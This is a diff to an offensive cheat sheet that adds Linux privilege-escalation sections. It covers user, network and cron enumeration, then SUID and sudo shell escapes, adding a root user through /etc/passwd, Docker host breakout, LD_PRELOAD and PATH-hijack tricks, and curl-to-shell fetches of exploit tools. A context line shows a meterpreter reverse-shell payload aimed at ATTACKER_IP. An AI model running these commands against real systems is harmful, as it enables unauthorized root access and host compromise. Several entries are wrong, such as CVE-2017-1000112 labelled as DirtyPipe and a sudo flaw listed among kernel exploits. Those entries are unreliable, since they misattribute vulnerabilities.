@@ -436,3 +436,345 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f 
 ```
 
 ---
+---
+
+## Linux
+
+### 16. Linux User Enumeration
+
+| Command | Purpose |
+|---------|---------|
+| `whoami` | Current username |
+| `id` | Current user ID, group ID, and group memberships |
+| `id username` | Information about a specific user (if you know the username) |
+| `cat /etc/passwd` | List all local users |
+| `cat /etc/passwd \| grep /bin/bash` | Users with bash as default shell |
+| `cat /etc/passwd \| grep /bin/sh` | Users with sh as default shell |
+| `cat /etc/passwd \| grep -E "/(bash|sh)$"` | Users with any shell |
+| `cat /etc/passwd \| grep -v /nologin \| grep -v /false` | Users with valid login shells |
+| `getent passwd` | List all users (including LDAP/SSSD) |
+| `getent passwd username` | Specific user info (including LDAP) |
+| `last` | Last logged-in users (from /var/log/wtmp) |
+| `lastlog` | Last login time for all users |
+| `lastlog -u username` | Last login for specific user |
+| `w` | Currently logged-in users with activity |
+| `who` | Currently logged-in users |
+| `users` | List currently logged-in usernames |
+| `ls /home` | List user home directories |
+| `ls /root` | List root home directory (requires root) |
+| `find /home -maxdepth 1 -type d` | Alternative way to list user home directories |
+| `cat /etc/shadow \| grep -v ":\*:\|:!\|:x:"` | Find users with weak password hashes (requires root) |
+| `awk -F: '($3 == 0) {print}' /etc/passwd` | Find UID 0 users (any user with root privileges) |
+| `awk -F: '($3 >= 1000) {print}' /etc/passwd` | Find human users (UID >= 1000 on most systems) |
+
+### 17. Linux Group Enumeration
+
+| Command | Purpose |
+|---------|---------|
+| `groups` | Current user's groups |
+| `groups username` | Specific user's groups |
+| `id -Gn` | Current user's group names (numeric) |
+| `id -gn` | Current user's primary group name |
+| `cat /etc/group` | All system groups |
+| `cat /etc/group \| grep sudo` | Users in sudo group |
+| `cat /etc/group \| grep wheel` | Users in wheel group (some distros) |
+| `cat /etc/group \| grep admin` | Users in admin group (some distros) |
+| `cat /etc/group \| grep docker` | Users in docker group (can escape to host) |
+| `cat /etc/group \| grep lxd` | Users in lxd group (can escape to host) |
+| `getent group` | All groups (including LDAP) |
+| `getent group groupname` | Specific group info (including LDAP) |
+| `members groupname` | List members of a group (requires `members` package) |
+| `grep -E "sudo\|wheel\|admin\|docker\|lxd" /etc/group` | Find high-value groups |
+| `awk -F: '{print $1, $4}' /etc/passwd` | Show primary group assignments |
+
+### 18. Linux System Information
+
+| Command | Purpose |
+|---------|---------|
+| `uname -a` | Kernel version and system info (name, version, architecture) |
+| `uname -r` | Kernel release only |
+| `uname -m` | Machine hardware architecture (x86_64, aarch64, etc.) |
+| `cat /etc/os-release` | Distribution information (ID, version, name) |
+| `lsb_release -a` | Distribution version (if installed) |
+| `cat /etc/*-release` | Distribution info (fallback for older systems) |
+| `hostname` | Hostname |
+| `hostnamectl` | Hostname and system info (systemd systems) |
+| `env` | All environment variables |
+| `set` | All environment variables and shell variables |
+| `printenv` | Print environment variables |
+| `printenv PATH` | Show PATH variable |
+| `cat /etc/profile` | System-wide environment settings |
+| `cat ~/.bashrc` | Current user's bash configuration |
+| `arch` | System architecture (same as `uname -m`) |
+| `lscpu` | CPU information (model, cores, threads) |
+| `cat /proc/cpuinfo` | Raw CPU information |
+| `free -h` | Memory usage (human-readable) |
+| `free -m` | Memory usage (MB) |
+| `df -h` | Disk usage (human-readable) |
+| `df -ha` | Disk usage including pseudo filesystems |
+| `mount` | Mounted filesystems |
+| `cat /proc/mounts` | Mounted filesystems (raw) |
+| `lsblk` | Block devices (disks, partitions) |
+| `fdisk -l` | Partition table (requires root) |
+| `cat /etc/fstab` | Filesystems mounted at boot |
+| `uptime` | System uptime and load average |
+| `date` | Current system time |
+| `last reboot` | Reboot history |
+| `dmesg \| tail -20` | Recent kernel messages |
+| `cat /var/log/syslog \| tail -20` | Recent system logs (Debian/Ubuntu) |
+| `cat /var/log/messages \| tail -20` | Recent system logs (RHEL/CentOS) |
+| `systemctl list-units --type=service --state=running` | Running systemd services (systemd systems) |
+| `systemctl list-units --type=service --state=failed` | Failed systemd services |
+
+### 19. Linux Network Enumeration
+
+| Command | Purpose |
+|---------|---------|
+| `ifconfig` | Network interfaces (legacy, may need net-tools) |
+| `ip a` | Network interfaces (modern) |
+| `ip r` | Routing table (modern) |
+| `route` | Routing table (legacy) |
+| `route -n` | Routing table (numeric, no DNS resolution) |
+| `arp -a` | ARP cache (shows other hosts on the same network) |
+| `ip neigh` | ARP cache (modern) |
+| `netstat -tulpn` | Listening ports and connections (legacy) |
+| `ss -tulpn` | Listening ports and connections (modern, faster) |
+| `netstat -ano` | All connections with PIDs |
+| `ss -anop` | All connections with PIDs (modern) |
+| `netstat -i` | Network interface statistics |
+| `ss -i` | TCP socket internal information |
+| `iptables -L` | Firewall rules (requires root) |
+| `iptables -L -n` | Firewall rules (numeric, no DNS) |
+| `nft list ruleset` | nftables rules (modern firewall) |
+| `cat /etc/hosts` | Static host mappings |
+| `cat /etc/resolv.conf` | DNS configuration |
+| `cat /etc/hostname` | System hostname (file) |
+| `cat /etc/network/interfaces` | Network configuration (Debian/Ubuntu legacy) |
+| `ls /etc/sysconfig/network-scripts/` | Network configuration (RHEL/CentOS) |
+| `nmcli device status` | NetworkManager device status |
+| `nmcli connection show` | NetworkManager connections |
+| `traceroute 8.8.8.8` | Trace route to external IP |
+| `tracepath 8.8.8.8` | Trace route (no root required) |
+| `ping -c 4 8.8.8.8` | Test connectivity to external host |
+| `dig google.com` | DNS lookup (requires dig) |
+| `nslookup google.com` | DNS lookup |
+| `host google.com` | DNS lookup |
+| `cat /var/lib/dhcp/dhclient.leases` | DHCP lease history (may contain hostnames) |
+| `cat /etc/netplan/*.yaml` | Netplan configuration (Ubuntu modern) |
+
+### 20. Linux SUID/SGID Binaries
+
+| Command | Purpose |
+|---------|---------|
+| `find / -perm -4000 -type f 2>/dev/null` | Find SUID binaries (setuid) |
+| `find / -perm -2000 -type f 2>/dev/null` | Find SGID binaries (setgid) |
+| `find / -perm -4000 -o -perm -2000 -type f 2>/dev/null` | Find SUID and SGID binaries |
+| `find / -uid 0 -perm -4000 -type f 2>/dev/null` | Find SUID binaries owned by root |
+| `find / -perm -u=s -type f 2>/dev/null` | Alternative SUID search |
+| `find / -perm -g=s -type f 2>/dev/null` | Alternative SGID search |
+| `find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null` | Find SUID binaries with details |
+| `find / -perm -4000 -type f -exec file {} \; 2>/dev/null` | Find SUID binaries with file type info |
+
+- **Common SUID binaries to check for known exploits:**
+
+| Binary | Exploit/Vulnerability |
+|--------|----------------------|
+| `pkexec` | CVE-2021-4034 (PwnKit) |
+| `sudo` | Check `sudo -l`, CVE-2019-14287, CVE-2021-3156 |
+| `su` | Standard su, often requires password |
+| `passwd` | Password change, not directly exploitable |
+| `mount`, `umount` | May have known vulnerabilities |
+| `chsh`, `chfn` | Change shell/finger info |
+| `gpasswd` | Group password management |
+| `newgrp` | Change group context |
+| `at` | Job scheduling (check `/etc/at.allow`, `/etc/at.deny`) |
+| `crontab` | Cron job management (check user's cron) |
+| `find` | `find / -exec /bin/sh \; -quit` |
+| `bash` | `bash -p` (preserve privileges) |
+| `less` | `less /etc/passwd`, then `!sh` |
+| `more` | `more /etc/passwd`, then `!sh` |
+| `vim` | `vim -c ':!/bin/sh'` |
+| `nano` | `nano`, then `^R^X`, then `reset; sh 1>&0 2>&0` |
+| `cp` | Can copy protected files |
+| `mv` | Can move protected files |
+| `chmod` | Can change permissions on protected files |
+| `tee` | `echo "user:pass" \| sudo tee -a /etc/passwd` |
+| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
+| `perl` | `perl -e 'exec "/bin/sh";'` |
+| `python` | `python -c 'import pty;pty.spawn("/bin/sh")'` |
+| `ruby` | `ruby -e 'exec "/bin/sh"'` |
+| `openssl` | Can be used for file encryption (not directly for shell) |
+
+### 21. Linux Sudo Misconfigurations
+
+| Command | Purpose |
+|---------|---------|
+| `sudo -l` | List current user's sudo permissions |
+| `sudo -ll` | List sudo permissions (detailed) |
+| `sudo -l -U username` | List sudo permissions for another user (requires sudo) |
+| `cat /etc/sudoers` | View sudoers file (requires root) |
+| `cat /etc/sudoers.d/*` | View sudoers includes (requires root) |
+| `visudo -c` | Check sudoers file for syntax errors (requires root) |
+
+- **Common sudo misconfigurations and how to exploit them:**
+
+| `sudo -l` Entry | Exploit Command |
+|-----------------|-----------------|
+| `(ALL) NOPASSWD: ALL` | `sudo su` or `sudo -i` |
+| `(ALL) NOPASSWD: /bin/bash` | `sudo /bin/bash` |
+| `(ALL) NOPASSWD: /bin/sh` | `sudo /bin/sh` |
+| `(ALL) NOPASSWD: /usr/bin/vim` | `sudo vim -c '!sh'` |
+| `(ALL) NOPASSWD: /usr/bin/nano` | `sudo nano`, then `^R^X`, then `reset; sh 1>&0 2>&0` |
+| `(ALL) NOPASSWD: /usr/bin/less` | `sudo less`, then `!sh` |
+| `(ALL) NOPASSWD: /usr/bin/more` | `sudo more`, then `!sh` |
+| `(ALL) NOPASSWD: /usr/bin/awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
+| `(ALL) NOPASSWD: /usr/bin/python*` | `sudo python -c 'import pty;pty.spawn("/bin/sh")'` |
+| `(ALL) NOPASSWD: /usr/bin/perl` | `sudo perl -e 'exec "/bin/sh";'` |
+| `(ALL) NOPASSWD: /usr/bin/ruby` | `sudo ruby -e 'exec "/bin/sh"'` |
+| `(ALL) NOPASSWD: /usr/bin/gcc` | `sudo gcc -wrapper /bin/sh,-s` |
+| `(ALL) NOPASSWD: /usr/bin/gdb` | `sudo gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh")' -ex quit` |
+| `(ALL) NOPASSWD: /usr/bin/git` | `sudo git -p help config` (then `!sh`) |
+| `(ALL) NOPASSWD: /usr/bin/zip` | Create a zip with symlink to /etc/passwd, then extract |
+| `(ALL) NOPASSWD: /usr/bin/tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
+| `(ALL) NOPASSWD: /usr/bin/find` | `sudo find / -exec /bin/sh \; -quit` |
+| `(ALL) NOPASSWD: /bin/systemctl` | `sudo systemctl exec systemd-journald /bin/sh` (advanced) |
+| `(ALL) NOPASSWD: /usr/bin/apt` | `sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh` |
+| `(ALL) NOPASSWD: /usr/bin/apt-get` | `sudo apt-get changelog apt` (then `!/bin/sh`) |
+| `(ALL) NOPASSWD: /usr/bin/dpkg` | `sudo dpkg --post-invoke=/bin/sh` |
+| `(ALL) NOPASSWD: /usr/bin/rsync` | `sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null` |
+| `(ALL) NOPASSWD: /usr/bin/env` | `sudo env /bin/sh` |
+| `(ALL) NOPASSWD: /bin/systemctl` | `sudo systemctl set-environment LD_PRELOAD=/tmp/evil.so` (then start a service) |
+
+### 22. Linux Cron Jobs
+
+| Command | Purpose |
+|---------|---------|
+| `cat /etc/crontab` | System-wide cron table |
+| `cat /etc/cron.d/*` | Cron.d entries (individual job files) |
+| `cat /etc/cron.daily/*` | Daily cron scripts |
+| `cat /etc/cron.hourly/*` | Hourly cron scripts |
+| `cat /etc/cron.weekly/*` | Weekly cron scripts |
+| `cat /etc/cron.monthly/*` | Monthly cron scripts |
+| `crontab -l` | Current user's crontab |
+| `crontab -l -u username` | Specific user's crontab (requires root) |
+| `ls -la /var/spool/cron/crontabs` | User crontab files |
+| `ls -la /var/spool/cron/` | User crontab files (location varies by distro) |
+| `find /etc/cron* -type f -name "*" -exec ls -la {} \; 2>/dev/null` | Find all cron files with permissions |
+| `find /etc/cron* -type f -name "*" -exec cat {} \; 2>/dev/null` | View all cron files content |
+| `systemctl list-timers` | Systemd timers (modern cron alternative) |
+| `systemctl list-timers --all` | All systemd timers (including inactive) |
+
+- **What to look for in cron jobs:**
+  - Writable cron scripts (check if you can modify them)
+  - Scripts in writable directories
+  - Commands that use wildcards (potential wildcard injection)
+  - Paths with spaces (potential unquoted path issues)
+  - Environment variables set in the crontab
+
+### 23. Linux Writable Files
+
+| Command | Purpose |
+|---------|---------|
+| `find / -writable -type d 2>/dev/null` | Find writable directories |
+| `find / -writable -type f 2>/dev/null` | Find writable files |
+| `find / -perm -2 -type d 2>/dev/null` | World-writable directories |
+| `find / -perm -2 -type f 2>/dev/null` | World-writable files |
+| `find / -perm -2 -type d -ls 2>/dev/null` | World-writable directories with details |
+| `find / -nouser -o -nogroup 2>/dev/null` | Files with no owner or no group |
+| `ls -la /etc/passwd` | Check if /etc/passwd is writable |
+| `ls -la /etc/shadow` | Check if /etc/shadow is writable |
+| `ls -la /etc/sudoers` | Check if /etc/sudoers is writable |
+| `ls -la /etc/sudoers.d/` | Check sudoers include directory |
+| `find / -type f \( -perm -2 -o -perm -20 \) -exec ls -la {} \; 2>/dev/null` | Find world-writable files (verbose) |
+| `find / -writable ! -user \`whoami\` -type f 2>/dev/null` | Find writable files not owned by current user |
+
+- **High-value writable targets:**
+  - `/etc/passwd` - if writable, you can add a root user
+  - `/etc/shadow` - if writable, you can change root password hash
+  - `/etc/sudoers` - if writable, you can add sudo permissions
+  - `/etc/crontab` - if writable, you can add a cron job
+  - `.bashrc` / `.profile` - user's shell configuration files
+  - `/etc/ld.so.conf` - library configuration
+  - `/etc/ld.so.preload` - library preloading
+
+### 24. Linux Kernel Exploits
+
+| Command | Purpose |
+|---------|---------|
+| `uname -a` | Get kernel version |
+| `uname -r` | Kernel release only |
+| `cat /proc/version` | Kernel version and compiler info |
+| `lsmod` | Loaded kernel modules |
+| `modinfo MODULE_NAME` | Information about a specific module |
+| `find /lib/modules -name "*.ko" -type f 2>/dev/null` | Available modules |
+| `find /lib/modules/$(uname -r) -name "*.ko" -type f` | Available modules for current kernel |
+| `cat /proc/sys/kernel/version` | Kernel version (alternative) |
+| `cat /proc/cpuinfo \| grep -E "model name\|flags"` | CPU information (check for Meltdown/Spectre) |
+
+- **Common Linux kernel vulnerabilities (historical reference):**
+
+| CVE | Name | Affected Kernels |
+|-----|------|------------------|
+| CVE-2016-5195 | DirtyCow | 2.6.22 - 4.8.3 (almost all before 2016) |
+| CVE-2017-1000112 | DirtyPipe | 5.8 - 5.16.11 |
+| CVE-2021-3493 | OverlayFS | Ubuntu kernels before 5.11 |
+| CVE-2019-13272 | ptrace | Kernels before 5.1 |
+| CVE-2017-6074 | DCCP double free | Kernels before 4.9 |
+| CVE-2021-3156 | Baron Samedit (sudo) | sudo versions 1.8.2 - 1.8.31p2 |
+| CVE-2017-1000367 | Stack Clash | Various kernels |
+| CVE-2017-1000253 | PIE stack corruption | Kernels before 4.14 |
+
+- **Tools for kernel exploit discovery:**
+  - `linux-exploit-suggester`: `curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh \| sh`
+  - `linux-exploit-suggester-2`: `curl -L https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl \| perl`
+  - `LES.sh`: Look for Linux privilege escalation scripts
+
+### 25. Linux Docker Breakout
+
+| Command | Purpose |
+|---------|---------|
+| `ls -la /.dockerenv` | Check if inside container (file exists) |
+| `cat /proc/1/cgroup \| grep -i docker` | Check cgroup for docker (alternative) |
+| `find / -name "*docker*" 2>/dev/null` | Find Docker-related files |
+| `docker info` | Docker info (if you have docker command) |
+| `docker images` | List Docker images (if you have docker command) |
+| `docker ps` | List running containers (if you have docker command) |
+| `docker run -it -v /:/host alpine chroot /host /bin/bash` | Escape using mounted host filesystem |
+| `mount` | Check mounted filesystems |
+| `cat /proc/mounts` | Raw mounted filesystems |
+| `fdisk -l` | List disks (may show host disks) |
+| `find / -name /var/run/docker.sock 2>/dev/null` | Check for Docker socket |
+| `capsh --print` | Show current capabilities |
+| `cat /proc/self/status \| grep Cap` | Show current capabilities (hex) |
+| `find / -perm -4000 -type f 2>/dev/null` | Look for SUID binaries inside container |
+
+- **Common Docker escape techniques:**
+  - Mounted Docker socket (`/var/run/docker.sock`) - can run commands on host
+  - Privileged container (`--privileged`) - can access host devices
+  - Mounted host filesystems - can write to host files
+  - CVE-2019-5736 (runc breakout) - overwrite runc binary
+  - `--cap-add=SYS_ADMIN` with mounted host filesystem
+
+### 26. Linux PATH Manipulation
+
+| Command | Purpose |
+|---------|---------|
+| `echo $PATH` | Show current PATH |
+| `find / -writable -type d 2>/dev/null` | Find writable directories |
+| `find / -writable -type d 2>/dev/null \| grep -v proc` | Find writable directories (exclude /proc) |
+| `find / -writable -type d -exec ls -ld {} \; 2>/dev/null` | Find writable directories with permissions |
+| `which COMMAND` | Show where a command is located |
+| `type COMMAND` | Show command type (builtin, alias, file) |
+| `export PATH=/tmp:$PATH` | Add /tmp to beginning of PATH (for current session) |
+| `export PATH=$PATH:/tmp` | Add /tmp to end of PATH (less likely to be used) |
+
+- **Attack: Create malicious binary in writable PATH directory**
+
+```bash
+* If a writable directory is in PATH
+echo '#!/bin/bash' > /tmp/ls
+echo '/bin/bash' >> /tmp/ls
+chmod +x /tmp/ls
+
+* Wait for a privileged user to execute 'ls'
+```
